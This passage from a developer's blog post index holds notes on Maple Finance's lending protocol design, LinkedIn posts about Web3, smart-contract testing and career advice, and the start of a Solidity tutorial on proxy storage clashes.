Tokens as they represent a claim over a part of principal plus any proportional interest that gets generated. . LoanFDTs that Maple is using isn’t the same old ERC20, they are using a relatively unknown ERC2222 standard. Need to check that thoroughly then. . Borrowers can drawdown any amount that is both above the request Loan amount, and below the current balance of the FundingLocker. | The question here is, why would Maple allow lenders to deposit funds in the Loan contract past their requested amount? Wouldn’t that essentially be wasted amount? . At the time of the drawdown: a percentage of the drawdown amount is paid to the MapleTreasury from the FundingLocker as the treasury fee. | investor fee is paid to the lenders (a % of the drawdown amount). Sent from FundingLocker to the Loan to be claimed by the lenders. Seems a bit off. Investigate again. . | Drawdown minus fee is transferred to the Borrower | . | Excess funds are sent to Loan contract to be claimed by the lenders. . | Normally, interest is paid in constant amounts at regular intervals, and principal is returned on last repayment. Otherwise, you can also pay the entire remaining balance of the loan in one transaction including principal and the amount the interest that should be paid (we use a function called PremiumCalc here). . | Liquidations work as usual apart from the fact that you can only call it as a pool delegate if your equity in the loan is more than the minLoanEquity | This again will be interesting to test. Should already be heavily testsed. . Another (unnatural) thing that Maple is doing in the Liquidation is that, post the calling of liquidation, they are taking the collateral from the CollateralLocker and converting it into the Borrow Asset using Uniswap and then transferring it to be to the Loan contract for being claimed by the lenders. | I don’t understand why didn’t Maple just let the lenders claim their share of the collateral in terms of collateral asset itself. Perhaps it has got to do something with the LoanFDT which is an ERC2222 instead of pure ERC20. Need to get more clarity here. . Understanding MPL Token . MPL token is the native token of Maple Protocol and it inherits: ERC20 for standard token behavior | ERC2222 for profit distribution of USDC from the Maple Treasury | . | Interestingly, the MPL token repo has only been audited by Peckshield. So, this token particularly must have stringent testing. . Also, what’s more interesting is that the scope of Peckshield’s audit is just ERC20-compliance of the Maple token . So, everyone already knows what ERC20 is, so let’s skip it. But what’s interesting…is the use of ERC2222 standard, which adds the functionality to represent claims on any type of crypto cash flow on top of ERC20 functionalities. Think of it like this standard enables dividend like payouts in crypto where token holders are treated akin to share holders and all withdrawals which is based on the proportion of the withdrawing party’s MPL holdings is taken care of, by ERC2222. . MPL token is used in the 50-50 MPL-USDC Balancer pool created during the protocol deployment and will be used in all other Balancer pools which will have BPTs used in StakeLockers. . | The MPL token recieves fee periodically from the Treasury (at the discretion of the Governor). Basically funds are gathered in the Maple Treasury from all kinds of protocol fee, converted to USDC and sent to the MPL token contract. . | When MPL tokens are added as liquidity to the Balancer Pool, the Balancer pool is the owner of those tokens, which are accruing USDC interest (from the Maple treasury, read point 3). To account for this, the FDT (MPL token contract) has an additional function called withdrawFundsOnBehalf which allows for the following: Claims USDC interest from MPL contract, transferring it into the Balancer pool contract address | The USDC supply increases and the MPL supply stays constant, increasing the implied value of MPL (since the buy pressure on MPL has increased) | . | Why did the buy pressure on MPL increase when the quantity of USDC increased in the MPL-USDC 50-50 balancer pool? . Well, because according to the constraints of the pool the quantity of both MPL and USDC must remain equal (50-50), and when the quantity of USDC is increased in the pool, the traders are incentivized to take out the excess USDC by supplying MPL. And to supply this MPL, they’ll have to buy it from some DEX/CEX. . Understanding Pool Cover . Simple Concept. Lender funds need to be protected in case of a loan default | This protection(cover) is provided by volunteers. How can they do this? | Well, first they have to add liquidity to the MPL-USDC 50-50 Balancer Pool and get Balancer Pool Tokens (BPTs). Users can also directly buy these tokens. | Now every pool has a stakeLocker where these users can stake their BPT tokens and get StakeLockerFDTs in return. | Users use these StakeLockerFDTs to claim all future interest, since Pools reward the StakeLockers with a portion of the revenue generated in compensation for assuming more risk. | And at the time of liquidation, if these tokens are enough to compensate the lenders for the difference between the collateral required and pending repayments, then these users get the remaining BPTs, else, tata, bye bye. | . | The actual calculation of the minimum amount needed to compensate the lenders is a bit complicated (atleast looks complicated), since it requires you to be a little familiar with the Balancer protocol too. . Need to study, understand and potentially test this calculation. . Understanding Lockers . Dedicated smart contracts to hold custody assets. They’re kinda paranoid. I like this. Ok, no they are not paranoid. It’ll be holding assets only in the v1. In later version it is supposed to all sorts of weird things. . | Lockers and what they hold: LiquidityLocker: asset used for liquidity for funding Loans | DebtLocker: Holds custody of LoanFDTs (to claim revenue and make liquidation calls) | StakeLocker: BPTs (used as a reserve to cover losses from defaulted Loans) | FundingLocker: Asset that will be borrowed during the funding period (pre-drawdown) | CollateralLocker: Collateral (against any loan) | . | In order for any new Locker strategy to be implemented, its corresponding Factory must be whitelisted in MapleGlobals using setValidSubFactory | Understanding Oracles . Chainlink oracles are used as price feeds. | An oracle wrapper contract acts as a safeguard against oracle downtime. I think a better solution would have been to have two oracle integrations (both Chainlink and Uni) so that if one fails, we always have the second one to fall back on. . | and yeah, even after those two, we could have had a oracle wrapper contract as a safeguard against orale downtime. . For USDC prices, a constant USD oracle will be deployed, with a constant price of 1 * 10 ** 8. Note that USDC has 6 decimals only but Chainlink price feeds use 8 decimals of precision | Planning for a zombie apocalype: Oracle wrappers have the capability to provide a manual price in the event of an oracle outage, using the security multisig. In all other cases, it will simply pass through the value from getLatestPrice in the Chainlink oracle. | . | ERC 2222 Working Mechanism: Example . Would be really cool and prolly helpful, if you go through this example and actually understand it. . Normal functioning of FDTs . Link . Functioning of ExtendedFDTs . These FDTs are extending the functionality of FDT to include functionality to account for losses that must also be distributed for liquidity providers and staker. . For Pools, it happens in the case when a loan has defaulted, all the BPTs are burnt and still there is a deficit. . For Stakers(StakeLocker), it happens in the case when a loan has defaulted and any number of BPTs are burnt. . Formulae used for accounting for losses are the exact same as normal FDTs. Check them out. . Link . Handling custodial ownership using ERC2258 . Another awesome ERC that Maple brings to light is the ERC2258, which allows tokens to be custodied by an entity such that they cannot be transferred/redeemed for underlying liquidity, yet allow the rightful owner to retain all future benefits and all losses. . Example: It allows users to stake PoolFDTs in the MplRewards contract without changing their PoolFDT ERC-20 balance. This allows them to earn MPL rewards in the MplRewards contract, while simultaneously accruing interest earned by the Pool. This would not have been possible with the original SNX-fork of the liquidity mining contract, since in that implementation, all Pool interest would have been accrued to the MplRewards contract itself, since it would hold a balance of PoolFDTs . This of it like pledging your stonks to someone. . Need to test this a bit.. can we transfer funds after giving custody and so on… . Invariant . This equation must always be satisfied: . liquidityLockerBal + principalOut = fdtTotalSupply + interestSum - poolLosses .",
            "url": "https://saxenism.com/web3/solidity/defi-tits/lending/protocol-deep-dive/maple/maple-finance/2022/08/02/maple-finance-rundown.html",
            "relUrl": "/web3/solidity/defi-tits/lending/protocol-deep-dive/maple/maple-finance/2022/08/02/maple-finance-rundown.html",
            "date": " • Aug 2, 2022"
        }
        
    
  
    
        ,"post10": {
            "title": "The Web3 Revolution - LinkedIn Post(s)",
            "content": "Let’s set the records straight. . Web3 is as much a social movement as it is a technological one. . Bitcoin was born as a result of the cumulation of people’s hopelessness and disgust at the status quo. . Every day joes like you and I were appalled by the completely arbitrary (and unjust) exercise of power by the people in power in times of crisis. . During the 2008 economic crisis, people realised that their money wasn’t really theirs. And, people were desperate for something that they can say was truly theirs. . Bitcoin was the answer for these people. . Fast forward to today, we talk about an enhanced version of Bitcoin called Web3, which was birthed by Ethereum. . Now, web3 means decentralised applications, where your accounts cannot be frozen simply because someone in a privileged position does not like you. It means, the flow of your money is extremely transparent and you can track your money to the last gwei and see where it is being spent. . Web3 means that you do not have to trust anyone with your money. . The code is the law and whatever the code says, will happen with your money. No one can take your money and take degen bets with it (unless you want them to). . But Rahul, things like these happen all the time. Look at Celcius, Vauld, 3AC, Bitfinex etc. . Yes, I know, and this is where I want to set the records straight. . Just because an application deals in crypto-currency or uses blockchain does not mean it is decentralised. If you have backend servers and databases (with an admin and passwords and all that circus) and you still use blockchain for a specific purpose, then yes, you can claim your website uses blockchain. But, saying your website is decentralised would be a flat-out lie. . As users, we must recognise the degree of centralisation in an application before we lend it our money. . Sure, exchanges like Vauld, Celcius etc are completely centralised and they can do whatever they feel like with your funds, but there are many other decentralised applications which are also not much decentralised simply because they use (token weighted) voting to take decisions and a minority of the users are majority token holders. For more context, read more about the Solend saga that went down just a few weeks back. . The bottom line here is that it is a choice. A very simple one. . If you do not want any hassle in regards to your money and want to rely on the goodwill of others, go ahead with your traditional banks and NBFCs. However, if you want a certain extent of control over your finances, start reading about how DeFi works. . Thank you &amp; Godspeed. .",
            "url": "https://saxenism.com/linkedin/non-technical/2022/07/30/LinkedIn-Web3-Cultural.html",
            "relUrl": "/linkedin/non-technical/2022/07/30/LinkedIn-Web3-Cultural.html",
            "date": " • Jul 30, 2022"
        }
        
    
  
    
        ,"post11": {
            "title": "Thoughts around testing - LinkedIn Post(s)",
            "content": "Article 1 . The world is an efficient place. . If there is any nook and cranny of the world from where value can be profitably extracted, it will be. . And amidst all the hype, excitement, convenient scapegoats, forgiving users and zero oversight, a serious issue in the DeFi space is creeping up. . For web3 protocols, which often work with a limited amount of developer and time resources, the efficient thing to do is to try and ship products as fast as possible. . From a purely economic perspective, it makes much more sense for a protocol to deploy its developer resources on building a v2 of their protocol, once the v1 has been coded up instead of engaging them in testing their protocol. . With the rise of big institutional investors entering the web3 space, with their big checks, this problem of lax testing is simply getting aggravated. If you are not sure why, google fiduciary duty. . However, not everything can be and must be seen from an economic perspective. DeFi protocols (and web3 protocols in general) handle the hard-earned money of everyday folks like you and me. These DeFi protocols HAVE to be held to a higher standard of testing. . No matter how many auditors have had a stab at your protocol, if you, the developer have not tested your protocol thoroughly then you are basically gambling with your user’s money. No amount of audits and no size of insurance pool can give you peace of mind about your protocol’s robustness as an extensive testing suite. . Therefore, we as a community of web3 native users must demand higher standards of testing from our protocols. We must raise our voices and hold our investments till each and every protocol that is built to handle users’ money comes up with a thorough testing suite. . I am confident, that we can make this change happen. . Why? . Because just like testing, it doesn’t make much economical sense for protocols to get their code audited, but they still do and that too from multiple audit houses. This is simply the result of the web3 users raising their standards for what is considered an acceptable protocol, where users would actually be putting their money. . I believe in the future of decentralised finance and I am of the firm belief that if it has to become sustainable and robust enough to survive all the onslaughts, then testing standards have to be improved. . Let me know what are your thoughts on this issue and if you would like to draw some parallels about this situation from the web2 world? . Thank you &amp; Godspeed. . Article 2 . A friend asked, why do you treat testing like a first-class citizen. . And I replied, That is because what I do is the software equivalent of launching space rockets. There is ZERO scope for any errors . That friend is from a conventional software space and thought software testing was more of a formality than a necessity. . This thought process is nothing atypical in the software industry. This philosophy would make sense in lean startups that focus obsessively on shipping newer products than expending their developer resources on (extensive) testing. But, when you are programming immutable smart contracts that will be deployed on blockchain and would be handling user funds, testing is paramount. . Let us consider an example: If the expected value of a variable in a test is say, 420.69 and you are getting the actual value as 420.59, then that is a difference of 0.1 units. . Is that significant? . Well, it very well can be. . If that unit was Ether, and the difference is coming as 0.1 Ether, then every time a user uses this particular function, they lose $300 USD assuming the price of 1 ETH to be $3000. . Depending on the asset, the loss post calling such a function can go even higher. . Not to mention, extensive test cases are a big help to the security auditors because it helps them cross-verify certain protocol behaviours. This enables them to focus on their actual job, ie, finding security vulnerabilities. . Anyway, when I told my friend about the implications of laxity in smart contract testing, he simply swore that he wouldn’t work in web3 ever. . Maybe I need to work on my explanatory/persuasion skills a bit 🥲 . Thank you &amp; Godspeed. . Article 3 . What allows a Formula 1 driver to fly around the track? . It’s not the engine, the tires, or the suspension. . It’s the brakes. . Strong, reliable brakes unlock the driver. Build brakes into your life that allow you to accelerate and hit turns without fear. . This is the Break Paradox that Sahil Bloom introduced to me with his tweets. Thinking along the same tangent I had been pondering over the arrested growth of #defi adoption by the masses. . Sure, the DeFi protocols across different chains have increased their TVLs, but most of the money there again is from crypto-native investors. . So, the question is, how do we build these breaks in our DeFi ecosystems. I have come up with a three-pronged answer. . Thorough protocol auditing | Many of the protocols that were exploited for millions of dollars were audited. We need increased accountability from auditing firms. . What I propose? Auditing firms stake a decent amount against the security of their audited protocol which gets linearly vested back to them if no hacks happen . Thorough protocol testing | Having been heavily involved in testing in my current position I have come to appreciate the art of testing contracts even more. Unfortunately the incentives of the protocol engineers are aligned in such way that it is beneficial for them to expend their developer resources of developing a v2 of their protocol instead of spending time on thoroughly testing their current protocols. . What I propose? Similar to the Audited by XYZ auditing firm badges that most protocols today flaunt, we should establish standards where firms award badges to these protocols according to the level of their testing. . DeFi insurance | After everything is said and done, DeFi is just lines of code after all and that too on a somewhat experimental technology. So, with the worst case scenario in mind, it would be better if we start encouraging users to get DeFi insurance for their DeFi exposures. . Sadly, DeFi insurance remains an extremely under-utilised financial instrument till date. Because, you don’t really need insurance until you need it :P . What I propose? . We should set industry-wide expectation on DeFi protocols to use a part of their protocol fee to insure user funds against any unexpected events. . These steps are a three-pronged strategy that I came up with, which I think can help accelerate true DeFi adoption. . Let me know if you agree/disagree and your rationale behind it. Even better would be if you could suggest some other changes that we need to undertake as an industry. . Thank you &amp; Godspeed. . Response recieved from Paweł Kuryłowicz in response to Article 3 . I disagree with the first and second point. . Here’s why 👇 . 1 In practice, audit is always a balance between being effective and keep clients cost low to best serve them. We set a point when we think we should find 99,9% of bugs and do not spend same amount of time just to make sure we have 100% (which btw is not possible as none can say that they know all possible attack vectors, it evolves, and we learn as well). If audit companies would have to “vest” their money based on security, it would skyrocket the prices to include potential risks of not getting paid. It would also set a bar higher for all beginners and close the space from new talents until they spent years on learning, and I personally do not want that. . We need new people, new devs, new auditors, new ideas. . 2 Badges? Cool, but maybe let’s leave it for scouts. Security report IS NOT a badge, stamp or certificate. Report IS NOT a guarantee that you are secure. . Security report IS a great source of knowledge. A fresh and experienced perspective on your project. Bunch of tips and best practices that you should consider. Document on which you and your devs should grow as better and more knowledgeable experts. . The thing that in my opinion really matters and make a difference is sharing. Sharing your researches, success, mistakes and ideas 💡 . So thank you Rahul Saxena for sharing your ideas, maybe I disagree with some of them, but it’s not always about bringing the perfect solution, sometimes it’s about starting a discussion and make it perfect later 😉 . Article 4 (My Response to Paweł Kuryłowicz) . This was a brilliant write-up. Thanks for taking out the time to show me how my post looks from the perspective of a blockchain security top gun. . Regarding, point number 1: True. This would shoot up the prices around auditing more than they already are and no one would want that. However, my intention with suggesting a vesting schedule for the audit firms was for them to get to have more skin in the game. As a fail-safe mechanism against lax auditing. . I’m sure that I don’t need to take names here, because you’d probably know a few audit firms that literally audit/approve any protocol that moves. Their audit report is essentially a joke since, all it contains is the report generated from a static analyser. . These are the type of in-authentic audit firms I wanted to hold accountable with my first point. . Regarding, point number 2: True again. A security/audit report is not a badge and shouldn’t be used as one. . But think from the perspective of a DeFi investor who could not read the code of a particular protocol either because they can’t read code or do not have the time to do so. For them, seeing that the protocol they are about to put their money in, is audited by multiple high-quality auditing firms, puts them at ease. . It essentially acts as a proxy to the trust-worthiness of the protocol developers and the robustness of their code. . This is the fact that I wanted to leverage when I talked about testing badges. By testing badges, do not think of them as literal badges, but exactly like audit reports, not for the protocol code itself, but for the testing that has been done for the code. . Again, I’d like to thank you for fleshing out your thoughts, since it helped me become more precise about my thoughts and adding a fresh perspective to it. . Article 5 . A huge concern raised universally in all DeFi protocol development is the safety of the locked funds. . Although, the audits are helpful, but the most robust method to find and quash bugs is through thorough testing. . In DeFi protocol testing, you should not aim for a good cover but a 100% code coverage, and the best methodology to cover as many test cases as possible is as follows: . Figure out all the different states that your contract can be in. | Write (setup in forge) functions to reach that state. | Create different testing contract suite for each of these states. For example: contract A should have state A already cached within it. | And in each of these state contracts, call all the external/public functions, no matter how absurd it seems. | Write all possible negative test cases (for example, a user cannot call function destroyProxy) and then write the positive test case. | This 5 step process is almost certainly guaranteed to speed up any protocol’s testing &amp; development speeds and provide the much required peace of mind to all invested parties. . Thanks, Rahul . Article 6 . I used to absolutely hate testing, when I started with my web3 job. . But now, I have found several critical bugs in our audited code-base and have implemented countless patches for gas optimizations. . How did this seemingly magical transformation happen for me? Let’s dive in. . Change of attitude The biggest factor in this transformation was the change in my own mindset. Fresh out of college, I used to think of testing as something inferior and allegedly less mentally stimulating. | However, over time I realised that the best testers actually have an exceedingly thorough understanding of the entire codebase. . When you know your code-base like the back of your hand, only then can you see things that no one else can, find pattern that no one else can imagine and eventually catch extremely non-trivial bugs . Time spent in dedicated practice Over time, if anyone sticks with a particular code-base, it is natural that they will get a better feel for what’s happening at every nook and corner of their code, which would essentially help them write better tests. | But since I wanted to expedite things, I went ahead and took out time separate from my office hours to study the code base and make notes. . This practice paid direct dividends, as soon after, the quality of my tests increased dramatically . Right Tools I was never much of a web developer and therefore had no special relationship with Javascript or Typescript. | The testing framework being used in protocol was Hardhat, which ensures that all the tests be written in Typescript with Mocha/Chai. . In this scenario, my mental RAM was many a times split into figuring out the intricacies of JS instead of focusing solely on the quality of my test cases. . With this in mind, I persuaded my team to use a new tool called Dapp.tools which allowed me to test contracts using Solidity itself. . Instant 10x productivity boost. . Changing Perspective At the beginning, when I was quite unfamiliar with the code-base, I asked my senior developers for a list of tests that I should write. | When granted that list, I made all attempts to make sure that the tests written in the document passed. I didn’t think a single line beyond of what was written in those docs. . Over time, when I gained a better understanding of the code base and caught hold of better testing tools, I started testing with the perspective of a user who’s hell bent of breaking the protocol. . And voila, bugs and optimizations started popping up like there was no tomorrow. . Testing smart contracts has been so rewarding an experience for me, that now I enjoy testing contracts even more than writing them. . Give testing a try with the correct mindset and I bet, you’ll love it. . Thank you &amp; Godspeed . PS: I’ll attach one of the pages from my notes when I was researching my protocol’s code-base for reference . .",
            "url": "https://saxenism.com/linkedin/non-technical/testing/2022/07/12/LinkedIn-Posts-Testing.html",
            "relUrl": "/linkedin/non-technical/testing/2022/07/12/LinkedIn-Posts-Testing.html",
            "date": " • Jul 12, 2022"
        }
        
    
  
    
        ,"post12": {
            "title": "Advice for devs trying to break into web3 - LinkedIn Post(s)",
            "content": "Article 1 . There are many resources out there for beginners to learn Solidity and get into web3 development. You can find them pretty easily and rest assured, most of them are decent-ish. . Now let’s talk a little bit about the intermediate stage for Blockchain developers. . If you are in college, take these classes listed below and give your 100% in them. If you’ve graduated, in a different field, or still in school study the below topics from YouTube/MIT OCW . Operating Systems | Automata Theory (Theory of computation) | Compiler Design | Analog Electronics | Microcontroller and Microprocessors | Optional: . Cryptography | Formal verification | MacroEconomics 101 | Game Theory | This is the stuff that will help you level up and make any actual difference as a blockchain engineer. Probably help you get that senior tag. . And if you think I’m bulls**ting you here, just go and see OpenSea’s Seaport contracts or try and code something non-trivial in Yul/Yul+ . Happy learning. If you have any reservations about any of the domain I mentioned, drop a comment. Would be happy to discuss. . Cheers. . Article 2 . I was frustrated in college. . I liked working with C++ and low-level programming. . However, when the time for internships and placements arrived, it seemed like, if you could not build a website or a mobile app, you were not a software engineer at all. . I learnt Javascript, the MERN stack and later Svelte just to be “employable”, and this was making me miserable. . Miserable because this, in essence, meant that I was in the wrong for pursuing my intellectual curiosities which lay outside of the web development world. . Do you feel the same? Slightly miffed at the general state of being simply because you are not eligible for many jobs if you genuinely enjoy working on anything apart from web/app development? . Well, don’t worry. I suffered because I did not know any better and unfortunately I did not listen to (or come across) someone who could have told me otherwise. . If you want to work in the blockchain development space, of course, you can learn Solidity and develop decentralised applications. . But if you want to work on an even deeper level and write low-level code, you can work on: Chain Indexing/Running scripts (Ethers-rs) Light Clients Wallet Software (transactions, encoding) Cryptography (elliptic curves, ZKP) Extending GETH with custom RPCs Running/Creating your own nodes Mempools MEVs Compilers (many chains are still to launch) VMs Testing Frameworks (such as Foundry) . All the above-listed domains rely heavily on shell scripting and languages like Go, Rust, C++ or even C. . So, if low-level code is your thing, a whole new world of exciting possibilities is waiting for you. . Jump onboard. . Thank you &amp; Godspeed . Article 3 . I’ve been working professionally as an engineer in the web3 space for more than 13 months now. . And in this duration, I have worked with incredibly skilled engineers, worked on a lot of chains, used a boatload of different protocols and grew exponentially as a (blockchain) engineer. . That would mean I know more about web3 than most of you reading this post, right? . Wrong. . The fact of the matter is that it will hardly take someone 1 week, even someone with zero web3 background, to become more knowledgeable than me. . So, does that mean I am dumb? No, not really. At least I hope I am not. . The answer to this riddle is the vastness of web3, just like any other industry. I am pretty confident talking or debating about decentralized lending with anyone in the world. I believe that I can talk to anyone in the decentralised lending space on an equal footing because that is the niche I picked up and worked on and around for my entire time. . I can’t make head or tail of how Bitcoin works, what TapRoot, Lightning network or the likes mean. I have zero ideas about the developments taking place in the NFT space. And, I simply run away from a room where Cairo circuits are being discussed. . So, you see, it really isn’t that difficult to get ahead, especially in the web3 domain, right now. All you need to do is first explore all web3 niches that you can, find the one where you enjoy working the most and keep on working in the niche, till you become one of the thought leaders in that space. . Wishing you all the very best, Thank you. . Article 4 . 7 steps to break into the web3 industry relatively risk free. . Recently a good friend of mine, who also happens to be a top-notch front end dev, reached out to me asking as to how he can break into the web3 industry. . Let me distil our conversation for you: . Get really good at front end concepts in general, because those remain the same in web2, web3 and probably in web30. | Focus on React. There isn’t sufficient diversity in FE tech of web3 yet. | Get comfortable with using ethers.js or web3.js . That is basically you should be able to call functions from a smart contract. | Get comfortable with wallet integrations and detecting several changes around it | Next, participate in atleast 4 hackathons (out of which atleast 2 should be solo) to build up your confidence in handling web3 stuff. | Make sure you interact with different web3 protocol JS/TS SDKs as much as possible during those hackathons. | Finally start applying to the protocols whose vision you believe in. | And yes, that is pretty much it. . This is how you can transition to the web3 industry without learning much apart from what you would have normally learnt for a web2 job. . Even if you want to be a smart contract dev, you can follow this road-map, since once you start working for a protocol as a FE engineer, you can transition internally into working on the smart contract side too. . Cheers. . Article 5 . When you’ve acquired your engineering skills and built multiple demonstrable products, the only thing that will stand between you and your (dream) web3 job would be your words. . When you cold approach engineers, architects, CEOs, CTOs of your preferred protocols, you’ll most likely do it through e-mails and/or DMs. If at this point of time, you are not able to succinctly and lucidly translate your engineering competence in (English) words, you’ll loose out on any potential opportunity. . Because, like it or not, in web3 you’re most likely to be doing a remote job and since your team would most probably be a diverse team, you NEED to have top-notch professional communication skills in a commonly understood language which would, in most cases be English. . So now, if you think you are skilled enough and want a leg-up, invest a month or two in learning how to communicate effectively. You wouldn’t regret it. . Cheers. . Article 6 . I’ve identified a professional goal for myself. . No matter how technical my work gets, I never intend to loose sight of the business objective of doing that work in the first place. . The last few weeks have been very intensive, with extreme focus on testing from my end to ensure that nothing breaks, no matter what situation turns up. . It so happened recently that I discovered a rather evasive bug. Also, for some reason my testing framework’s stack trace has gone absolute bonkers and therefore isn’t much help for finding the exact problem area. . Therefore, I ran through the entire flow in the code base, dry ran almost everything with an example and finally had a good idea of where everything was going wrong. . In the team meeting for the next day, I presented my findings rather triumphantly and what followed was quite unexpected. . My senior got in a call with me to better understand the issue and told me something that will stick with me for a long time. . He told me, Rahul, you are a developer and for a software firm, a developer’s time is precious. You cannot spend it on speculation. I don’t want to know where you think the bug comes from, I want to know the exact line where the bug is coming from and that too with proof. . This changed my mindset for the better. I realised that at the end of the day, my (technical) work is also geared towards generating the maximum value output and therefore, I must pick my engineering battles basing them on the relevant business perspective. . Suffice to say, I found the exact lines, emitted events to find the states of the contract, eventually fixed the bug and walked away with an interesting lesson for life. . Did this resonate with you? Let me know what you think? . Thank you &amp; Godspeed 🚀 . Article 7 . Almost everyone hates detailed code documentation. But is there a way around it? Probably yes. . uint256 interestAccruedTillLastPrincipalUpdate; . The above term is a variable declaration of type unsigned integer. The variable name is unexpectedly long, and feels quite unnatural at first. . At the beginning of my software development journey, like everyone else, I had a pre-conceived notion that, yes, a variable name should be able to define what it stands for but it should never be too big. . However, ever since starting out at my current position and combing through the existing code-base, I became comfortable with using these kind of long descriptive names for variables. The benefits of such names are multi-fold: . Your mental RAM is better used up on logic implementation rather than keeping a mental track of which variable is for what purposes | The code readability or rather understand-ability improves dramatically | As the dev, you can get done with very minimal in-code comments, since the variable names are themselves so explanatory. | . With the combination of these descriptive variable names and minimal natspec comments, literally anyone can take up the task of creating documentation for the code-base. . Developers new to the code-base, technical content writers, freelancers, or even the dev who wrote the code (after 4 months of writing :P) can come up and get the documentation over with in a flash. . Since nobody really likes documentation and yet nobody contests the necessity of good documentation for a successful project, probably the best solution is to do it as quickly and as painlessly as possible. . This is the best method that I have come across, till date. Let me know if you think there is a better approach out there. . Thank you &amp; Godspeed 🚀 . Article 8 . This is THE best hack to supercharge your software development career. . As developers, it would be a fair to assume that we need hard programming skills in order to progress in this domain. As a corollary, the faster we develop these hard skills, the faster we get promoted to bigger and better roles. . This is assuming you work in a merit-driven organisation and if you don’t, start your interview prep :P . Now, we already know of ways to develop these skills: . Reading domain related books, blogs, etc. | Building relevant projects on the side | Getting more involved in the testing side of things | Simply coding for more hours | . which are all fine, but the one hack that is much more efficient than everything else on this list is: . Tagging along with your senior developers in their code reviews. . When you are on a call with your senior developer who is, arguably, much better than you, you can pick up on so many things within a short duration of time. . You realise . How the senior developers view a code base | How they spot bugs | How they think about different solutions to the bugs and come at a conclusion | Which parts they skim and which parts catch their attention and why? | . I have done this multiple times at my current position and there wasn’t a single instance when I did not walk away with something new and something to add to my own programming arsenal. . Try this out and see the amazing benefits for yourself. . Thank you &amp; Godspeed 🚀 . Article 9 . This is one dance that I absolutely love to do. . I’m not much of a dancer, but I do dance and do so quite often. It’s an exhilarating experience for me, challenging and enjoyable at the same time. . The same, I feel, happens when I talk about and discuss protocol architectures. Web3 protocol design is an exciting dance between keeping your users safe vs decreased de-centralization, between lower gas consumption for the user vs the security of the entire protocol, between providing more options to the user vs reducing your protocol complexity and many many more. . The thing that I absolutely love here is that there are no right answers. Partly because protocol architecture is not yet as formalized as web2 software design but mostly because every protocol is unique and the intent behind the protocol is unique. . That’s why I love this game and is also one of my favorite questions for interviews. . Using any web3 protocol? Try and learn more about their architecture decisions and their reasons for going with them. I promise you, it would be one hell of a rewarding experience. . Thank you &amp; Godspeed. . Article 10 . How to get started with blockchain development ? This is one question that I get very frequently. . I almost always send them two twitter threads on this exact topic. One authored by me and another by Nader Dabit. Links to them will be in the first comment of this post. . These are not the only sources of learning blockchain development, and with every passing day, more and more developers are putting out excellent learning content on Youtube including Patrick Collins from Chainlink, Andrew Griffith from Ethereum, Eat the Blocks and many others. . However, I feel the problem that people today face is one of overt-abundance in stark contrast to the problem of acute scarcity that most of the previous generations faced. Therefore, if you want to focus your mental RAM on learning art and science of blockchain development rather than picking the right course, simply follow the threads. . After you are done with both the threads, then take a break and explore which area of web3/blockchain development excites you the most and then learn about the programming principles prevalent in that sub-section of blockchain development. Participating in hackathons and building relevant products from the ground-up is the fastest way to do that. . After that you are ready to start working with your dream protocol in your preferred sector. . Thank you &amp; Godspeed. . Threads . https://twitter.com/saxenism/status/1404688104263274496?s=19 . | https://t.co/jpe3KPNt67 . | Article 11 . I was recently on call with an exciting early stage web3 start-up, helping them list the preferred candidate requirements in their job listing. . I believe that the outline of that call is relevant to everyone looking to either break into the web3 space as developers or looking to simply step-up their game. . Without going into the specifics of what that start-up is aiming to build, here is a list of my suggestions to them: . No minimum experience. | I have seen senior software engineers unable to rebase their forked repositories while, builders younger than me creating entire protocols themselves from scratch. . Ability to work with OpenZeppelin contracts. especially upgradable contracts. | Deploying a smart contract on the blockchain is like sending a rocket in space. Nothing can be done after the lauch, unless you know how to work with OpenZeppelin upgradable contracts. . Experience with Dapp.tools/Forge preferred. Hardhat experience will also do. | The entire web3 industry is shifting rapidly to dapp.tools (or forge) for their testing requirements from Hardhat for a number of reasons. And no, no one uses Ganache/Truffle now. . Knack for sniffing out possible gas optimizations. | Well, saving money for your users is a no-brainer. . Familiarity with common (past) smart contract vulnerabilities and the solidity patterns to by-pass that | While developing smart contracts, you have to have a healthy mix of red and blue team mindset. . Interest in economics/financial concept. | This basically is a good proxy to determine whether you’d actually enjoy working on the project or would treat your job as a chore. . There were a few more points, but the above list would give all web3 devs a solid leg-up and make them an irresistible choice for all web3 protocols looking to hire. . Hope everyone finds great value from the above list. . Thank you &amp; Godspeed. .",
            "url": "https://saxenism.com/linkedin/non-technical/2022/06/15/LinkedIn-Advice-New-Devs.html",
            "relUrl": "/linkedin/non-technical/2022/06/15/LinkedIn-Advice-New-Devs.html",
            "date": " • Jun 15, 2022"
        }
        
    
  
    
        ,"post13": {
            "title": "Solidity Contract Proxies",
            "content": "Migration or Social Yeet (CT Lingo) . You keep all your deployed contracts immutable and non-upgradable. So, when you actually need to modify your deployed contract’s logic or add some functionality, you have to deploy a new contract and ask the users to start making their calls to this newly deployed version of your protocol’s smart contract address. . This is the truest form of upgrading your contracts, without compromising on the trustless (no onlyAdmin functions) and decentralisation facets of web3. However, as is amply clear pulling this type of an upgrade isn’t really a breeze. . Proxies . Proxy Terminologies . The Implementation Contract Which has all our code of our protocol. When we upgrade, we launch a brand new implementation contract. | . | The Proxy Contract Which points to which implementation is the “correct” one, and routes everyone’s function calls to that contract | . | The User The make calls to the proxy | . | The admin This is the user(or group of users/voters) who upgrade to new implementation contracts. | . | Storage Variables . The cool thing about proxies and delegate call is that all our storage variables are going to be stored in the proxy contract and not in the implementation contract. Therefore, when you deploy a new contract and your proxy starts pointing to this new contract, you don’t have to migrate the data from the old contract as it is already in the proxy contract. . Issues with proxies . 1. Storage Clashes . When we do delegateCall from the proxyContract, we do the logic of implementationContract inside the proxyContract. . In Solidity storage layout begins at position 0 and increments for each new state variable. A proxy contract and its delegate/logic contracts share the same storage layout! . Here is an example to illustrate the problem. ProxyA defines two state variables, facetA and owner . . contract ProxyA { address facetA; address owner; constructor() public { owner = msg.sender; facetA = 0x0b22380B7c423470979AC3eD7d3c07696773dEa1; } fallback() external payable { address facetAddress = facetA; assembly { ... code omitted for simplicity } } } . FacetA declares one state variable. . contract FacetA { address user; function getUser() external view returns(address) { return user; } function setUser(address newUser) external { user = newUser; } } . ProxyA delegates function calls to FacetA. The problem is that, when delegating, ProxyA and FacetA share the same storage layout. The state variable facetA is at position 0. And The state variable user is also at position 0. So if the setUser function is called it will set user and facetA to the newUser value, which is obviously not the intention, the intention just being to set user only. . So, basically, you can only ever append variables to your implementation contract and not really change or re-order the old ones. . Now,ideally if you called setValue using delegateCall from your proxy contract, it should set the value of differentValue but it sets the value . 